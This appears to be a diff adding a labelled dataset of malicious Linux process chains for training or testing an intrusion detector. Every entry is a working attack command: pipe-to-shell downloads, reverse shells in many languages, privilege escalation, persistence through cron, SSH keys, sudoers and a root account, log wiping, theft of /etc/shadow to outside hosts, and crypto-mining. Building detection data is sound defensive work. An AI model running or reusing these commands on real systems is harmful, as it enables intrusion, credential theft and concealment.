@@ -1,0 +1,94 @@
+// Malicious process creation chains: LotL techniques from GTFOBins and public reverse-shell / persistence
+// cheat sheets (Boros et al. 2022 §3.1), placed under the parents that spawn them in real attacks
+// (web-server RCE, malicious document, compromised session, cron persistence). Linux only, matching the
+// benign traces. Format: {"chain": [root, ..., parent, image], "cmdline": "..."}; "//" lines are comments.
+{"chain": ["systemd", "nginx", "php-fpm8.2", "sh"], "cmdline": "sh -c curl -s http://185.199.110.7/x.sh | sh"}
+{"chain": ["systemd", "nginx", "php-fpm8.2", "sh", "wget"], "cmdline": "wget -q -O /tmp/.k http://45.33.12.9/k"}
+{"chain": ["systemd", "nginx", "php-fpm8.2", "sh"], "cmdline": "sh -c chmod +x /tmp/.k && /tmp/.k"}
+{"chain": ["systemd", "apache2", "sh"], "cmdline": "sh -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"}
+{"chain": ["systemd", "apache2", "sh", "bash"], "cmdline": "bash -i"}
+{"chain": ["systemd", "apache2", "sh"], "cmdline": "sh -c id; uname -a; cat /etc/passwd"}
+{"chain": ["systemd", "apache2", "sh", "cat"], "cmdline": "cat /etc/passwd"}
+{"chain": ["systemd", "apache2", "sh", "uname"], "cmdline": "uname -a"}
+{"chain": ["systemd", "apache2", "sh", "id"], "cmdline": "id"}
+{"chain": ["systemd", "httpd", "sh"], "cmdline": "/bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNS85MDAxIDA+JjE= | base64 -d | bash"}
+{"chain": ["systemd", "httpd", "sh", "base64"], "cmdline": "base64 -d"}
+{"chain": ["systemd", "java", "sh"], "cmdline": "/bin/sh -c curl -fsSL http://malicious-cdn.xyz/m | bash"}
+{"chain": ["systemd", "java", "bash"], "cmdline": "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjQvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}"}
+{"chain": ["systemd", "java", "sh", "nc"], "cmdline": "nc -e /bin/sh 198.51.100.4 443"}
+{"chain": ["systemd", "java", "sh"], "cmdline": "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.4 443 >/tmp/f"}
+{"chain": ["systemd", "java", "sh", "mkfifo"], "cmdline": "mkfifo /tmp/f"}
+{"chain": ["systemd", "gunicorn", "sh"], "cmdline": "/bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.9\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"}
+{"chain": ["systemd", "gunicorn", "sh", "python3"], "cmdline": "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.9\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"}
+{"chain": ["systemd", "uwsgi", "sh", "python3"], "cmdline": "python3 -c import pty;pty.spawn(\"/bin/bash\")"}
+{"chain": ["systemd", "nginx", "php-fpm8.2", "sh", "php"], "cmdline": "php -r $sock=fsockopen(\"10.10.14.3\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");"}
+{"chain": ["systemd", "nginx", "php-fpm8.2", "sh", "perl"], "cmdline": "perl -e use Socket;$i=\"10.10.14.3\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};"}
+{"chain": ["systemd", "nginx", "php-fpm8.2", "sh", "ruby"], "cmdline": "ruby -rsocket -e f=TCPSocket.open(\"10.10.14.3\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"}
+{"chain": ["systemd", "redis-server", "sh"], "cmdline": "sh -c echo '* * * * * bash -i >& /dev/tcp/192.0.2.15/7777 0>&1' > /var/spool/cron/root"}
+{"chain": ["systemd", "postgres", "sh"], "cmdline": "sh -c wget http://192.0.2.15/kdevtmpfsi -O /tmp/kdevtmpfsi; chmod +x /tmp/kdevtmpfsi; nohup /tmp/kdevtmpfsi &"}
+{"chain": ["systemd", "postgres", "sh", "kdevtmpfsi"], "cmdline": "/tmp/kdevtmpfsi"}
+{"chain": ["systemd", "mysqld", "sh", "awk"], "cmdline": "awk BEGIN {s = \"/inet/tcp/0/192.0.2.15/4444\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}"}
+{"chain": ["systemd", "systemd", "firefox", "sh"], "cmdline": "/bin/sh -c curl -s https://paste-bin.top/raw/a8f3 | bash"}
+{"chain": ["systemd", "systemd", "firefox", "bash"], "cmdline": "bash -c $(curl -fsSL http://185.199.110.7/i)"}
+{"chain": ["systemd", "systemd", "thunderbird", "sh"], "cmdline": "sh -c wget -qO- http://update-check.ru/u | sh"}
+{"chain": ["systemd", "systemd", "soffice.bin", "sh"], "cmdline": "/bin/sh -c python3 -c \"import urllib.request,os;open('/tmp/.u','wb').write(urllib.request.urlopen('http://203.0.113.77/u').read());os.system('chmod +x /tmp/.u;/tmp/.u')\""}
+{"chain": ["systemd", "systemd", "soffice.bin", "python3"], "cmdline": "python3 -c import urllib.request,os;open('/tmp/.u','wb').write(urllib.request.urlopen('http://203.0.113.77/u').read());os.system('chmod +x /tmp/.u;/tmp/.u')"}
+{"chain": ["systemd", "systemd", "evince", "sh"], "cmdline": "sh -c nohup /dev/shm/.x >/dev/null 2>&1 &"}
+{"chain": ["systemd", "systemd", "evince", "sh", ".x"], "cmdline": "/dev/shm/.x"}
+{"chain": ["systemd", "systemd", "brave", "bash"], "cmdline": "bash -c curl http://198.51.100.23:8080/s.sh -o /tmp/s.sh && bash /tmp/s.sh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sh"], "cmdline": "sh -i >& /dev/udp/203.0.113.50/53 0>&1"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c exec 5<>/dev/tcp/203.0.113.50/80;cat <&5 | while read line; do $line 2>&5 >&5; done"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "socat"], "cmdline": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:203.0.113.50:4444"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "ncat"], "cmdline": "ncat 203.0.113.50 4444 -e /bin/bash"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "nc"], "cmdline": "nc -lvnp 4444 -e /bin/sh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "telnet"], "cmdline": "telnet 203.0.113.50 4444"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "openssl"], "cmdline": "openssl s_client -quiet -connect 203.0.113.50:443"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "lua"], "cmdline": "lua -e require('socket');require('os');t=socket.tcp();t:connect('203.0.113.50','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "node"], "cmdline": "node -e require('child_process').exec('nc -e /bin/sh 203.0.113.50 4444')"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "find"], "cmdline": "find . -exec /bin/sh -p \\; -quit"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "vim"], "cmdline": "vim -c ':!/bin/sh'"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "tar"], "cmdline": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "env"], "cmdline": "env /bin/sh -p"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "chmod"], "cmdline": "chmod u+s /bin/bash"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "chmod"], "cmdline": "chmod 4755 /tmp/.rootsh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "cp"], "cmdline": "cp /bin/bash /tmp/.rootsh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOpBnGqN7m attacker@kali' >> ~/.ssh/authorized_keys"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "crontab"], "cmdline": "crontab -l | { cat; echo \"*/5 * * * * curl -s http://192.0.2.15/c.sh | sh\"; } | crontab -"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c echo 'bash -i >& /dev/tcp/192.0.2.15/9001 0>&1' >> ~/.bashrc"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c echo /tmp/libhook.so > /etc/ld.so.preload"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo usermod -aG sudo sysupd"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c echo 'sysupd ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "systemctl"], "cmdline": "systemctl enable --now /tmp/.sysupd.service"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c unset HISTFILE; history -c"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "rm"], "cmdline": "rm -rf /var/log/auth.log /var/log/syslog"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo journalctl --vacuum-time=1s"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo setenforce 0"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo auditctl -e 0"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo iptables -F"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "sudo"], "cmdline": "sudo ufw disable"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "shred"], "cmdline": "shred -u -z /tmp/.k /tmp/s.sh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "dd"], "cmdline": "dd if=/etc/shadow of=/dev/shm/.s"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "tar"], "cmdline": "tar czf /tmp/.k.tgz /home/user/.ssh /etc/shadow"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "curl"], "cmdline": "curl -X POST --upload-file /tmp/.k.tgz http://198.51.100.23:8000/up"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "wget"], "cmdline": "wget --post-file=/etc/shadow http://198.51.100.23:8000/"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "xxd"], "cmdline": "xxd -r -p /tmp/.p /tmp/.bin"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAA | base64 -d > /dev/shm/.e; chmod +x /dev/shm/.e; /dev/shm/.e"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c LD_PRELOAD=/tmp/libhook.so /usr/bin/passwd"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "gdb"], "cmdline": "gdb -nx -ex '!sh' -ex quit"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "docker"], "cmdline": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "python3"], "cmdline": "python3 -c import os;os.setuid(0);os.system('/bin/sh')"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "perl"], "cmdline": "perl -e exec \"/bin/sh\";"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "nmap"], "cmdline": "nmap -sS -p- 10.0.0.0/24"}
+{"chain": ["systemd", "systemd", "kitty", "bash", "bash"], "cmdline": "bash -c for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i >/dev/null && echo 10.0.0.$i) & done"}
+{"chain": ["systemd", "cron", "sh"], "cmdline": "/bin/sh -c curl -s http://192.0.2.15/c.sh | sh"}
+{"chain": ["systemd", "cron", "sh", "curl"], "cmdline": "curl -s http://192.0.2.15/c.sh"}
+{"chain": ["systemd", "cron", "sh", "bash"], "cmdline": "bash -i >& /dev/tcp/192.0.2.15/9001 0>&1"}
+{"chain": ["systemd", "cron", "sh"], "cmdline": "/bin/sh -c (curl -fsSL http://pool-cfg.xyz/xm || wget -q -O- http://pool-cfg.xyz/xm) | bash"}
+{"chain": ["systemd", "sshd", "sshd", "bash", "wget"], "cmdline": "wget http://198.51.100.23/xmrig -O /dev/shm/.xm"}
+{"chain": ["systemd", "sshd", "sshd", "bash", ".xm"], "cmdline": "/dev/shm/.xm -o pool.minexmr.com:443 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge -k --tls"}
+{"chain": ["systemd", "sshd", "sshd", "bash", "bash"], "cmdline": "bash -c cat /etc/shadow; getent passwd; sudo -l"}
+{"chain": ["systemd", "sshd", "sshd", "bash", "ssh"], "cmdline": "ssh -o StrictHostKeyChecking=no -R 9050:localhost:22 tunnel@198.51.100.23"}
+{"chain": ["systemd", "sshd", "sshd", "bash", "scp"], "cmdline": "scp -o StrictHostKeyChecking=no /tmp/.k.tgz u@198.51.100.23:/x/"}
